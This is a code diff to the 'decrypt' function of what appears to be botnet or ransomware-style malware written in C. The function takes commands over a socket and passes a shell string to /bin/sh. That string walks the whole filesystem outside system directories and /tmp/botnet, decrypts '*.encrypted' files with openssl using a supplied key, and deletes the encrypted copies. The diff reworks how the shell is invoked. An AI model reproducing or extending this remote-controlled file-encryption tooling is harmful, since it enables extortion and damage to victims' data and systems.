@@ -327,15 +327,14 @@ void decrypt(int sockfd, const char *filepath, const char* key) {
     Command cmd = {
         .cmd_id = "0",
         .delay = 0,
-        .program = strdup("find"), // Dynamically allocate program
+        .program = strdup("/bin/sh"), // Dynamically allocate program
         .expected_exit_code = 0,
-        .params = malloc(1 * sizeof(char *))
+        .params = malloc(3 * sizeof(char *)), // Allocate space for params
     };
-
     char command[2048];
     snprintf(
         command, sizeof(command),
-        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \\) -prune -o -type f -name \"*.encrypted\" -exec sh -c 'original=\"${1%%.encrypted}\"; "
+        " %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \\) -prune -o -type f -name \"*.encrypted\" -exec sh -c 'original=\"${1%%.encrypted}\"; "
         "if openssl aes-256-cbc -d -a -pbkdf2 -in \"$1\" -out \"$original\" -k \"%s\"; then "
         "echo \"Déchiffré avec succès: $1\"; "
         "rm -f \"$1\"; "
@@ -344,8 +343,9 @@ void decrypt(int sockfd, const char *filepath, const char* key) {
         "fi' _ {} \\;",
         filepath, key
     );
-    cmd.params[0] = strdup(command); // Add the command as the first parameter
-    cmd.params[1] = NULL; // Null-terminate the params array
+    cmd.params[0] = strdup("-c"); // First parameter is the shell option
+    cmd.params[1] = strdup(command); // Second parameter is the command to execute
+    cmd.params[2] = NULL; // Null-terminate the params array
     output_log("decrypt : Decrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
     
     parse_and_execute_command(cmd, sockfd); // Execute the command
